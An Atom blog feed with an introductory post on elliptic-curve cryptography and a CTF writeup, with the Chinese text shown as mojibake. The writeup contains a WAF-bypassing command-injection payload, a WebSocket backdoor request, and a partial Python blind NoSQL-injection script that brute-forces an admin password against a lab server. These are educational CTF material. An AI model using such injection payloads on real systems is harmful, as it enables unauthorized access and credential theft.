<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Moon Jam&#39;s Blog</title>
  
  <subtitle>I&#39;m a panda</subtitle>
  <link href="https://moon-jam.me/atom.xml" rel="self"/>
  
  <link href="https://moon-jam.me/"/>
  <updated>2025-09-16T15:13:40.462Z</updated>
  <id>https://moon-jam.me/</id>
  
  <author>
    <name>Moon Jam</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>[ECC æ©¢åœ“æ›²ç·šå¯†ç¢¼å­¸ï¼š30 å¤©å¾å…¥é–€åˆ°å…¥åœŸ] å‰è¨€</title>
    <link href="https://moon-jam.me/IThome_2025ironman_ECC_Day01/"/>
    <id>https://moon-jam.me/IThome_2025ironman_ECC_Day01/</id>
    <published>2025-09-14T16:00:00.000Z</published>
    <updated>2025-09-16T15:13:40.462Z</updated>
    
    <content type="html"><![CDATA[<!-- > æœ¬æ–‡åŒæ­¥åˆŠè¼‰æ–¼ [[ECC æ©¢åœ“æ›²ç·šå¯†ç¢¼å­¸ï¼š30 å¤©å¾å…¥é–€åˆ°å…¥åœŸ] å‰è¨€](https://moon-jam.me/IThome_2025ironman_ECC_Day01/) --><p>å—¨å¤§å®¶ï¼Œæˆ‘æ˜¯ Pandaï¼Œå¹³å¸¸å¶çˆ¾æœƒå‡ºç¾åœ¨å„ç¨® Conferenceçœ‹çœ‹ä¸–ç•Œé•·é»è¦‹è­˜ï¼Œé€™æ¬¡éµäººè³½æ˜¯è·Ÿæˆå¤§è³‡å®‰ç¤¾ç‰›è‚‰æ¹¯çš„æœ‹æœ‹ä¸€èµ·çµ„éšŠï¼Œå¸Œæœ›å¯ä»¥è·Ÿå¤§å®¶ä¸€èµ·å®Œè³½ã€‚</p><p>ä»¥æˆ‘çš„è§€å¯Ÿï¼Œåœ¨è‡ºç£æ‰“ CTFçš„ç©å®¶ï¼Œæœ€å°‘ç ”ç©¶çš„æ‡‰è©²æ˜¯å¯†ç¢¼å­¸å§ï¼Œä¹Ÿè¨±æ˜¯è¦ºå¾—å­¸å¯†ç¢¼å­¸å°å¯¦å‹™ä¸Šæ²’å•¥å¹«åŠ©ï¼Œè€Œäº‹å¯¦ä¸ŠCrypto æ¯”èµ· Web Reverse Pwn Forensics åœ¨ Real Worldçš„æ¼æ´ç¢ºå¯¦å°‘å¾—å¤šï¼Œæˆ‘æœƒæƒ³åšé€™å€‹ä¸»é¡Œå°±é‚„æ˜¯ç‚ºäº†å¥½ç©å•¦ï¼Œæ¼”ç®—æ³•åœ¨è…¦ä¸­æµå‹•çš„æ„Ÿè¦ºé‚„æ˜¯æŒºä¸éŒ¯çš„ï¼Œå¦å¤–ç›®å‰AI é‚„æ²’è¾¦æ³•å¾ˆç©©å®šè§£å‡º CTF çš„ Crypto é¡Œï¼Œä¹Ÿèƒ½åœ¨ä¹‹å¾Œæ‰“ CTFæ™‚å‰µé€ é»å„ªå‹¢ã€‚</p><p>ä¹‹æ‰€ä»¥æœƒé¸æ“‡ ECC ä¸€æ–¹é¢æ˜¯åœ¨ CTF å¸¸è¦‹çš„å¹¾ç¨® Crypto é¡Œç›®ä¸­ï¼ˆAES / RSA /ECCï¼‰ï¼Œå°±åªæœ‰ ECCæˆ‘æ˜¯æ²’ä»€éº¼å­¸éçš„ï¼Œå¦ä¸€æ–¹é¢å°±æ˜¯ä»–çš„æ‡‰ç”¨è »å»£çš„ï¼Œæ¯”è¼ƒå¸¸æœ‰æ©Ÿæœƒè·Ÿåˆ¥äºº<del>ç‚«è€€</del> åˆ†äº«èªªè‡ªå·±çŸ¥é“ä»–å€‘èƒŒå¾ŒåŸç†æ˜¯ä»€éº¼ï¼ŒåƒTLS / SSLã€åŠ å¯†è²¨å¹£çš„å€å¡Šéˆäº¤æ˜“ç°½ç« ã€OpenSSHã€WireGuard VPNç­‰ç­‰çš„ï¼Œç„¶å¾Œå› ç‚º ECC é‡‘é‘°æ¯”è¼ƒå°ï¼Œé‹ç®—æ¯”è¼ƒå¿«ï¼Œæ‰€ä»¥ä¹Ÿå¸¸ç”¨åœ¨ IoTä¸Šï¼Œå°±æƒ³èªªè¶é€™å€‹æ©Ÿæœƒå¥½å¥½å­¸ä¸€ä¸‹ï¼Œå…å¾—æ¯æ¬¡éƒ½åªæ˜¯æœƒè·Ÿåˆ¥äººæ‰“æ‰“å˜´ç‚®ä½†å…¶å¯¦èƒŒå¾ŒåŸç†ä¸€çŸ¥åŠè§£ XD</p><p>é€™å€‹ç³»åˆ—ä¸­ï¼Œæœƒä»¥ä¸€å€‹å·²ç¶“å° ç¾ä»£å¯†ç¢¼å­¸æœ‰éåŸºç¤èªè­˜çš„åˆå­¸è€…çš„è§’åº¦ï¼Œè¨˜éŒ„å­¸ç¿’æ©¢åœ“æ›²ç·šå¯†ç¢¼å­¸éç¨‹ï¼Œè¦æ˜¯æ–‡ç« çš„å®‰æ’æœ‰é»äº‚é‚„è«‹è¦‹è«’ï¼Œå¦‚æœæœ‰å¯«éŒ¯çš„åœ°æ–¹ä¹Ÿæ­¡è¿å¤§å®¶æŒ‡æ­£ï¼Œå¸Œæœ›å¯ä»¥å¹«åŠ©åˆ°åŒæ¨£å°å¯†ç¢¼å­¸æ¼”ç®—æ³•æœ‰èˆˆè¶£çš„äººå€‘owo/</p><p>æœ€å¾Œé—œæ–¼é¡Œç›®ï¼Œæˆ‘åœ¨ä»Šå¤©æ‰ç™¼ç¾å¥½åƒæ‡‰è©²å«<code>æ©¢åœ“æ›²ç·šå¯†ç¢¼å­¸</code>æ¯”è¼ƒå¥½ï¼Œç•¢ç«Ÿå¾Œé¢é™¤äº†è¬›åŠ å¯†å¤–å¤§éƒ¨åˆ†æ‡‰è©²éƒ½æ˜¯èªªæ•¸ä½ç°½ç« ï¼Œä½†å› ç‚ºçµ„éšŠæŒ‘æˆ°æ˜¨å¤©å°±æˆªæ­¢äº†ï¼Œé™¤éæˆ‘é‡æ–°å ±åå¦å‰‡éµäººè³½çš„é¡Œç›®æ²’è¾¦æ³•æ”¹ï¼Œå°±ç®—äº†å§ï¼Œä¸éæ¯å¤©çš„æ¨™é¡Œå°±é‚„æ˜¯æœƒå¯«æ”¹æˆå¯«æ©¢åœ“æ›²ç·šå¯†ç¢¼å­¸æ¯”è¼ƒç¬¦åˆå…§å®¹ã€‚</p><span id="more"></span><h2 id="æˆ‘çš„ç’°å¢ƒ">æˆ‘çš„ç’°å¢ƒ <a href="#æˆ‘çš„ç’°å¢ƒ" class="headerlink"></a></h2><p>åœ¨é€™å€‹ç³»åˆ—ä¸­ï¼Œæˆ‘æ‡‰è©²æœƒä¸»è¦ç”¨ Python å’Œ C++ ä¾†å¯¦ä½œï¼Œä½œæ¥­ç³»çµ±å¯èƒ½æœƒæ˜¯MacOS 15.6 å’Œ Fedora 42 äº¤å‰ä½¿ç”¨ï¼Œä½†æ‡‰è©²æ˜¯ä¸æœƒæœ‰ä»€éº¼å½±éŸ¿ã€‚</p><h2 id="åˆæ¢-ecc-æ©¢åœ“æ›²ç·šå¯†ç¢¼å­¸">åˆæ¢ ECC æ©¢åœ“æ›²ç·šå¯†ç¢¼å­¸ <a href="#åˆæ¢-ecc-æ©¢åœ“æ›²ç·šå¯†ç¢¼å­¸" class="headerlink"></a></h2><p>å› ç‚ºæˆ‘è‹±æ–‡ä¸å¤ªå¥½ï¼Œåˆæ‡¶å¾—çœ‹æ–‡å­—ï¼Œå°±ç›´æ¥ä¸Š YouTubeä¸Šçœ‹çœ‹æœ‰æ²’æœ‰äº›è³‡æºå¯ä»¥åƒè€ƒ</p><figure><img data-src="https://raw.githubusercontent.com/moon-jam/BlogPictures/main/ECC_serach_on_YouTube.png" alt="åœ¨ Youtube ä¸ŠæŸ¥ ECC æ©¢åœ“æ›²ç·šåŠ å¯†çš„ä¸­æ–‡çµæœ"><figcaption aria-hidden="true">åœ¨ Youtube ä¸ŠæŸ¥ ECCæ©¢åœ“æ›²ç·šåŠ å¯†çš„ä¸­æ–‡çµæœ</figcaption></figure><p>æ‰€ä»¥æˆ‘å°±æŠŠå…©éƒ¨å½±ç‰‡çœ‹å®Œäº†ï¼ŒæŒºé…·çš„ï¼Œçµ¦å®šä¸€æ¢æ›²ç·šï¼š <span class="math inline">\(y^2 = x^3 + ax + b\)</span></p><p>ç‚ºæ›²ç·šä¸Šçš„é»ï¼Œå®šç¾©ä¸€ç¨®ç‰¹åˆ¥çš„åŠ æ³•å’Œä¹˜æ³•ï¼Œ <span class="math inline">\(A+B=C\)</span> å¦‚ä¸‹åœ–æ‰€ç¤ºï¼Œ<span class="math inline">\(C\)</span> ç‚ºé <span class="math inline">\(A\)</span> èˆ‡ <span class="math inline">\(B\)</span> ç›´ç·šï¼Œå’Œæ›²ç·šçš„äº¤é»å°ç¨± X è»¸å¾Œçš„é»</p><figure><img data-src="https://raw.githubusercontent.com/moon-jam/BlogPictures/main/ECC_Add.png" alt="æ›²ç·šä¸Šé»çš„åŠ æ³•"><figcaption aria-hidden="true">æ›²ç·šä¸Šé»çš„åŠ æ³•</figcaption></figure><figure><img data-src="https://raw.githubusercontent.com/moon-jam/BlogPictures/main/ECC_Add_associative.png" alt="é€™æ¨£å®šç¾©çš„åŠ æ³•å…·æœ‰çµåˆå¾‹ï¼ˆæ²’æˆªåˆ°å®Œæ•´çš„åœ–ï¼Œä½†ç›¸ä¿¡å¤§å®¶æ‡‰è©²å¯ä»¥çœ‹å¾—æ‡‚ï¼‰"><figcaption aria-hidden="true">é€™æ¨£å®šç¾©çš„åŠ æ³•å…·æœ‰çµåˆå¾‹ï¼ˆæ²’æˆªåˆ°å®Œæ•´çš„åœ–ï¼Œä½†ç›¸ä¿¡å¤§å®¶æ‡‰è©²å¯ä»¥çœ‹å¾—æ‡‚ï¼‰</figcaption></figure><p>è€Œ <span class="math inline">\(A + A\)</span> å°±æ˜¯ Aé»åˆ‡ç·šèˆ‡æ›²ç·šçš„äº¤é»å°ç¨± X è»¸å¾Œçš„é»ï¼Œä¸¦å®šç¾©é€™å€‹é»ç‚º <span class="math inline">\(2A\)</span> å¦‚ä¸‹</p><figure><img data-src="https://raw.githubusercontent.com/moon-jam/BlogPictures/main/ECC_multi.png" alt="æ›²ç·šä¸Šé»çš„ä¹˜æ³•"><figcaption aria-hidden="true">æ›²ç·šä¸Šé»çš„ä¹˜æ³•</figcaption></figure><p>å› ç‚ºåŠ æ³•æœ‰çµåˆå¾‹ï¼Œæ‰€ä»¥æ˜é¡¯çš„ <span class="math inline">\(3A = A +2A\)</span>ï¼Œ<span class="math inline">\(2A + 2A = 4A\)</span>ï¼Œå° <span class="math inline">\(kA\)</span> çš„é‚£å€‹é»åªéœ€è¦åš <span class="math inline">\(\log_{2} k\)</span>æ¬¡çš„é‹ç®—å°±èƒ½æ‰¾åˆ°ï¼Œé€™å€‹å°ç´°ç¯€å°å¾Œé¢è¬›åˆ°æ™‚é–“æ•ˆç‡æ™‚æœƒæœ‰å¹«åŠ©ã€‚</p><p>è€Œåœ¨åŠ å¯†æ™‚ï¼Œä»–å€‘å¯ä»¥ç”¨ä»¥ä¸‹çš„æ–¹å¼å‰µé€ å‡ºå…±åŒå¯†é‘°ä¸¦é€šè¨Šï¼š</p><ol type="1"><li>å°ä¸€å€‹çµ¦å®šçš„æ›²ç·šï¼ˆå³ <span class="math inline">\(y^2 = x^3 + ax +b\)</span> çš„ <span class="math inline">\(a, b\)</span>å›ºå®šï¼‰ï¼Œå’Œçµ¦å®šçš„é» <span class="math inline">\(G\)</span></li><li>Alice å’Œ Bob å„è‡ªç”Ÿæˆç§é‘° <span class="math inline">\(a, b\)</span>(<span class="math inline">\(a, b\)</span> æœƒæ˜¯å¾ˆå¤§çš„æ•¸å­—)</li><li>Alice å’Œ Bob äº’ç›¸å‚³é <span class="math inline">\(aG\)</span> å’Œ<span class="math inline">\(bG\)</span> ç®—å‡ºçš„é»æ˜¯ä»€éº¼</li><li>é€™æ™‚ Alice å¯ä»¥ç®—å‡º <span class="math inline">\(a(bG)\)</span> è€ŒBob å¯ä»¥ç®—å‡º <span class="math inline">\(b(aG)\)</span>è€Œé€™å€‹çµæœæœƒæ˜¯ä¸€æ¨£çš„é»ï¼Œä¸”é™¤ä»–å€‘å…©å€‹å¤–æ²’æœ‰å…¶ä»–äººèƒ½é‹ç”¨ <span class="math inline">\(G, aG, bG\)</span> ç®—å‡º</li><li>é‹ç”¨é€™çµ„å¯†é‘°åšåŠ å¯†é€šè¨Š</li></ol><h2 id="çµèª">çµèª <a href="#çµèª" class="headerlink"></a></h2><p>ä»Šå¤©å°±å·®ä¸å¤šåˆ°é€™è£¡ï¼Œåœ¨åˆæ¢äº†æ˜¯æ€éº¼ä½¿ç”¨æ©¢åœ“æ›²ç·šåšåŠ å¯†å¾Œï¼Œä¸‹ä¸€æ­¥æ‡‰è©²æœƒæƒ³è©³ç´°çœ‹çœ‹ä»–èƒŒå¾Œçš„æ•¸å­¸åŸç†ï¼Œäº†è§£ä»–çš„å®‰å…¨æ€§ï¼Œå¸Œæœ›ä¸è¦è¢«æ•¸å­¸æ‰“æ•—äº†ï¼Œæ„Ÿè¬å¤§å®¶owo/</p><h2 id="åƒè€ƒè³‡æ–™">åƒè€ƒè³‡æ–™ <a href="#åƒè€ƒè³‡æ–™" class="headerlink"></a></h2><ul><li><a href="https://youtu.be/laXAMPP4vds">å…¬é’¥åŠ å¯†æŠ€æœ¯ ECC æ¤­åœ†æ›²çº¿åŠ å¯†ç®—æ³•åŸç†</a></li><li><a href="https://youtu.be/0_XmvNu0J40">æ¤­åœ†æ›²çº¿åŠ å¯†ä¸å“ˆå¸Œå‡½æ•°æ˜¯ä»€ä¹ˆï¼Ÿéå¯¹ç§°åŠ å¯†æ˜¯ä»€ä¹ˆï¼Ÿæ¯”ç‰¹å¸ä¸­çš„æ•°å­¦åŸç†</a></li></ul><!-- > æœ¬æ–‡åŒæ­¥åˆŠè¼‰æ–¼ [[ECC æ©¢åœ“æ›²ç·šå¯†ç¢¼å­¸ï¼š30 å¤©å¾å…¥é–€åˆ°å…¥åœŸ] å‰è¨€](https://moon-jam.me/IThome_2025ironman_ECC_Day01/) -->]]></content>
    
    
    <summary type="html">&lt;!-- &gt; æœ¬æ–‡åŒæ­¥åˆŠè¼‰æ–¼ [[ECC æ©¢åœ“æ›²ç·šå¯†ç¢¼å­¸ï¼š30 å¤©å¾å…¥é–€åˆ°å…¥åœŸ] å‰è¨€](https://moon-jam.me/IThome_2025ironman_ECC_Day01/) --&gt;
&lt;p&gt;å—¨å¤§å®¶ï¼Œæˆ‘æ˜¯ Pandaï¼Œå¹³å¸¸å¶çˆ¾æœƒå‡ºç¾åœ¨å„ç¨® Conference
çœ‹çœ‹ä¸–ç•Œé•·é»è¦‹è­˜ï¼Œé€™æ¬¡éµäººè³½æ˜¯è·Ÿæˆå¤§è³‡å®‰ç¤¾ç‰›è‚‰æ¹¯çš„æœ‹æœ‹ä¸€èµ·çµ„éšŠï¼Œå¸Œæœ›å¯ä»¥è·Ÿå¤§å®¶ä¸€èµ·å®Œè³½ã€‚&lt;/p&gt;
&lt;p&gt;ä»¥æˆ‘çš„è§€å¯Ÿï¼Œåœ¨è‡ºç£æ‰“ CTF
çš„ç©å®¶ï¼Œæœ€å°‘ç ”ç©¶çš„æ‡‰è©²æ˜¯å¯†ç¢¼å­¸å§ï¼Œä¹Ÿè¨±æ˜¯è¦ºå¾—å­¸å¯†ç¢¼å­¸å°å¯¦å‹™ä¸Šæ²’å•¥å¹«åŠ©ï¼Œè€Œäº‹å¯¦ä¸Š
Crypto æ¯”èµ· Web Reverse Pwn Forensics åœ¨ Real World
çš„æ¼æ´ç¢ºå¯¦å°‘å¾—å¤šï¼Œæˆ‘æœƒæƒ³åšé€™å€‹ä¸»é¡Œå°±é‚„æ˜¯ç‚ºäº†å¥½ç©å•¦ï¼Œæ¼”ç®—æ³•åœ¨è…¦ä¸­æµå‹•çš„æ„Ÿè¦ºé‚„æ˜¯æŒºä¸éŒ¯çš„ï¼Œå¦å¤–ç›®å‰
AI é‚„æ²’è¾¦æ³•å¾ˆç©©å®šè§£å‡º CTF çš„ Crypto é¡Œï¼Œä¹Ÿèƒ½åœ¨ä¹‹å¾Œæ‰“ CTF
æ™‚å‰µé€ é»å„ªå‹¢ã€‚&lt;/p&gt;
&lt;p&gt;ä¹‹æ‰€ä»¥æœƒé¸æ“‡ ECC ä¸€æ–¹é¢æ˜¯åœ¨ CTF å¸¸è¦‹çš„å¹¾ç¨® Crypto é¡Œç›®ä¸­ï¼ˆAES / RSA /
ECCï¼‰ï¼Œå°±åªæœ‰ ECC
æˆ‘æ˜¯æ²’ä»€éº¼å­¸éçš„ï¼Œå¦ä¸€æ–¹é¢å°±æ˜¯ä»–çš„æ‡‰ç”¨è »å»£çš„ï¼Œæ¯”è¼ƒå¸¸æœ‰æ©Ÿæœƒè·Ÿåˆ¥äºº
&lt;del&gt;ç‚«è€€&lt;/del&gt; åˆ†äº«èªªè‡ªå·±çŸ¥é“ä»–å€‘èƒŒå¾ŒåŸç†æ˜¯ä»€éº¼ï¼Œåƒ
TLS / SSLã€åŠ å¯†è²¨å¹£çš„å€å¡Šéˆäº¤æ˜“ç°½ç« ã€OpenSSHã€WireGuard VPN
ç­‰ç­‰çš„ï¼Œç„¶å¾Œå› ç‚º ECC é‡‘é‘°æ¯”è¼ƒå°ï¼Œé‹ç®—æ¯”è¼ƒå¿«ï¼Œæ‰€ä»¥ä¹Ÿå¸¸ç”¨åœ¨ IoT
ä¸Šï¼Œå°±æƒ³èªªè¶é€™å€‹æ©Ÿæœƒå¥½å¥½å­¸ä¸€ä¸‹ï¼Œå…å¾—æ¯æ¬¡éƒ½åªæ˜¯æœƒè·Ÿåˆ¥äººæ‰“æ‰“å˜´ç‚®ä½†å…¶å¯¦èƒŒå¾ŒåŸç†ä¸€çŸ¥åŠè§£ XD&lt;/p&gt;
&lt;p&gt;é€™å€‹ç³»åˆ—ä¸­ï¼Œæœƒä»¥ä¸€å€‹å·²ç¶“å° ç¾ä»£å¯†ç¢¼å­¸
æœ‰éåŸºç¤èªè­˜çš„åˆå­¸è€…çš„è§’åº¦ï¼Œè¨˜éŒ„å­¸ç¿’æ©¢åœ“æ›²ç·šå¯†ç¢¼å­¸éç¨‹ï¼Œè¦æ˜¯æ–‡ç« çš„å®‰æ’æœ‰é»äº‚é‚„è«‹è¦‹è«’ï¼Œå¦‚æœæœ‰å¯«éŒ¯çš„åœ°æ–¹ä¹Ÿæ­¡è¿å¤§å®¶æŒ‡æ­£ï¼Œå¸Œæœ›å¯ä»¥å¹«åŠ©åˆ°åŒæ¨£å°å¯†ç¢¼å­¸æ¼”ç®—æ³•æœ‰èˆˆè¶£çš„äººå€‘
owo/&lt;/p&gt;
&lt;p&gt;æœ€å¾Œé—œæ–¼é¡Œç›®ï¼Œæˆ‘åœ¨ä»Šå¤©æ‰ç™¼ç¾å¥½åƒæ‡‰è©²å«&lt;code&gt;æ©¢åœ“æ›²ç·šå¯†ç¢¼å­¸&lt;/code&gt;æ¯”è¼ƒå¥½ï¼Œç•¢ç«Ÿå¾Œé¢é™¤äº†è¬›åŠ å¯†å¤–å¤§éƒ¨åˆ†æ‡‰è©²éƒ½æ˜¯èªªæ•¸ä½ç°½ç« ï¼Œä½†å› ç‚ºçµ„éšŠæŒ‘æˆ°æ˜¨å¤©å°±æˆªæ­¢äº†ï¼Œé™¤éæˆ‘é‡æ–°å ±åå¦å‰‡éµäººè³½çš„é¡Œç›®æ²’è¾¦æ³•æ”¹ï¼Œå°±ç®—äº†å§ï¼Œä¸éæ¯å¤©çš„æ¨™é¡Œå°±é‚„æ˜¯æœƒå¯«æ”¹æˆå¯«æ©¢åœ“æ›²ç·šå¯†ç¢¼å­¸æ¯”è¼ƒç¬¦åˆå…§å®¹ã€‚&lt;/p&gt;</summary>
    
    
    
    <category term="IThome 2025 éµäººè³½" scheme="https://moon-jam.me/categories/IThome-2025-%E9%90%B5%E4%BA%BA%E8%B3%BD/"/>
    
    
    <category term="è³‡å®‰" scheme="https://moon-jam.me/tags/%E8%B3%87%E5%AE%89/"/>
    
    <category term="CTF" scheme="https://moon-jam.me/tags/CTF/"/>
    
    <category term="IThome 2025 éµäººè³½" scheme="https://moon-jam.me/tags/IThome-2025-%E9%90%B5%E4%BA%BA%E8%B3%BD/"/>
    
    <category term="å¯†ç¢¼å­¸" scheme="https://moon-jam.me/tags/%E5%AF%86%E7%A2%BC%E5%AD%B8/"/>
    
    <category term="ECC" scheme="https://moon-jam.me/tags/ECC/"/>
    
  </entry>
  
  <entry>
    <title>2025 SCIST MID CTF Writeup</title>
    <link href="https://moon-jam.me/2025_SCIST_MID_CTF_Writeup/"/>
    <id>https://moon-jam.me/2025_SCIST_MID_CTF_Writeup/</id>
    <published>2025-02-11T16:00:00.000Z</published>
    <updated>2025-11-02T11:18:39.438Z</updated>
    
    <content type="html"><![CDATA[<h1 id="scist-mid-ctf-writeup">SCIST MID CTF Writeup <a href="#scist-mid-ctf-writeup" class="headerlink"></a></h1><figure><img data-src="https://i.imgur.com/I5lei4J.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>æˆ‘æ˜¯ SCIST_31 /</p><span id="more"></span><h2 id="web">Web <a href="#web" class="headerlink"></a></h2><h3 id="dig-waf4">dig-waf4 <a href="#dig-waf4" class="headerlink"></a></h3><p>è·Ÿä½œæ¥­å¹¾ä¹ä¸€æ¨£ï¼Œä½†å¤šç¦äº†ä¸€äº›æ±è¥¿ï¼Œä¸éç©ºæ ¼é‚„æ˜¯å¯ä»¥ç”¨<code>$IFS</code> ä»£æ›¿ï¼Œå°±æˆåŠŸã„Œ</p><p>payload: <code>more$IFS/*_*</code></p><p>flag:<code>SCIST{command_injection_has_somany_combinations!}</code></p><h3 id="da-vinci-code-online">Da Vinci Code online ğŸ›œ <a href="#da-vinci-code-online" class="headerlink"></a></h3><p>è¦åœ¨ä¸‰æ¬¡å…§çŒœåˆ°ä¸€å€‹ 0-10000 ä¸­çš„ä¸€å€‹æ•¸å­—ï¼Œé€šéˆäº†å¹¾æ¬¡æ²’æˆåŠŸåªå¥½å»çœ‹code äº†</p><p>ç™¼ç¾</p><figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">getSecretAnswer</span>(<span class="params">command</span>) {</span><br><span class="line">    <span class="keyword">if</span> (command === <span class="string">'SHOW_ME_THE_ANSWER_PLZ'</span>) {</span><br><span class="line">        <span class="keyword">return</span> { <span class="attr">status</span>: <span class="string">'secret'</span>, <span class="attr">answer</span>: <span class="variable language_">this</span>.<span class="property">answer</span> };</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> { <span class="attr">status</span>: <span class="string">'error'</span>, <span class="attr">message</span>: <span class="string">'Invalid command'</span> };</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (data.<span class="property">type</span> === <span class="string">'guess'</span>) {</span><br><span class="line">    response = room.<span class="property">gameRoom</span>.<span class="title function_">guess</span>(data.<span class="property">number</span>);</span><br><span class="line">} <span class="keyword">else</span> <span class="keyword">if</span> (data.<span class="property">type</span> === <span class="string">'backdoor'</span>) {</span><br><span class="line">    response = room.<span class="property">gameRoom</span>.<span class="title function_">getSecretAnswer</span>(data.<span class="property">command</span>);</span><br><span class="line">} <span class="keyword">else</span> {</span><br><span class="line">    response = { <span class="attr">status</span>: <span class="string">'error'</span>, <span class="attr">message</span>: <span class="string">'Invalid message type'</span> };</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>æ‰€ä»¥å°±åªè¦ç”¨ BurpSuite ä¿®æ”¹ Websocket çš„å…§å®¹</p><figure class="highlight json"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">{</span><span class="attr">"type"</span><span class="punctuation">:</span><span class="string">"backdoor"</span><span class="punctuation">,</span><span class="attr">"number"</span><span class="punctuation">:</span><span class="number">100</span><span class="punctuation">,</span><span class="attr">"command"</span><span class="punctuation">:</span><span class="string">"SHOW_ME_THE_ANSWER_PLZ"</span><span class="punctuation">}</span></span><br></pre></td></tr></tbody></table></figure><figure class="highlight json"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">{</span><span class="attr">"status"</span><span class="punctuation">:</span><span class="string">"secret"</span><span class="punctuation">,</span><span class="attr">"answer"</span><span class="punctuation">:</span><span class="number">7586</span><span class="punctuation">}</span></span><br></pre></td></tr></tbody></table></figure><p>å°±èƒ½æˆåŠŸç²å¾— Flag äº†ï½</p><p>flag: <code>SCIST{WC_5c1St_Sc0r3bo4rD_1s5u3}</code></p><h3 id="nosql-injection-blind2">nosql injection blind2 <a href="#nosql-injection-blind2" class="headerlink"></a></h3><p>è·Ÿä½œæ¥­çš„ nosql injection ä¸€æ¨£ï¼Œä½†æ¯å€‹å­—çš„ range è®Šå¤§äº† (000 ~)ï¼Œå› ç‚ºä¹‹å‰ code å°±æ˜¯ç”¨äºŒåˆ†æœï¼Œæ‰€ä»¥åŸºæœ¬ä¸Šå°±æ”¹ä¸€é»é»å°±èƒ½å¾—åˆ° Flag ã„Œ</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¨­å®šç›®æ¨™ URL</span></span><br><span class="line">url = <span class="string">"http://lab.scist.org:31601/login"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆå§‹ flag</span></span><br><span class="line">extracted_flag = <span class="string">"SCIST"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å­—ç¬¦é›†</span></span><br><span class="line"><span class="comment"># æ·»åŠ  Unicode å­—ç¬¦é›†</span></span><br><span class="line">charset = <span class="built_in">list</span>(<span class="string">"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!_{}"</span>) + [<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">168</span>, <span class="number">0xFFFF</span> + <span class="number">1</span>) <span class="keyword">if</span> <span class="built_in">chr</span>(i).isprintable()]</span><br><span class="line"></span><br><span class="line"><span class="comment"># å°‡å­—ç¬¦é›†ä¸­çš„æ¯å€‹å­—å…ƒé€²è¡Œæ­£å‰‡è¡¨é”å¼è½‰ç¾©</span></span><br><span class="line">escaped_charset = <span class="string">""</span>.join(re.escape(char) <span class="keyword">for</span> char <span class="keyword">in</span> charset)</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¸ƒæ—æŸ¥è©¢å‡½æ•¸</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test_payload</span>(<span class="params">payload</span>):</span><br><span class="line">    headers = {<span class="string">"Content-Type"</span>: <span class="string">"application/json"</span>}</span><br><span class="line">    data = {</span><br><span class="line">        <span class="string">"username"</span>: <span class="string">"admin"</span>,</span><br><span class="line">        <span class="string">"password"</span>: {<span class="string">"$regex"</span>: payload},</span><br><span class="line">    }</span><br><span class="line">    response = requests.post(url, json=data, headers=headers)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"Login successful"</span> <span class="keyword">in</span> response.text</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä½¿ç”¨äºŒåˆ†æœå°‹æ³•ä¾†æ¸¬è©¦æŸä½ç½®çš„å­—ç¬¦</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">binary_search_for_char</span>(<span class="params">base_flag, charset</span>):</span><br><span class="line">    low, high = <span class="number">0</span>, <span 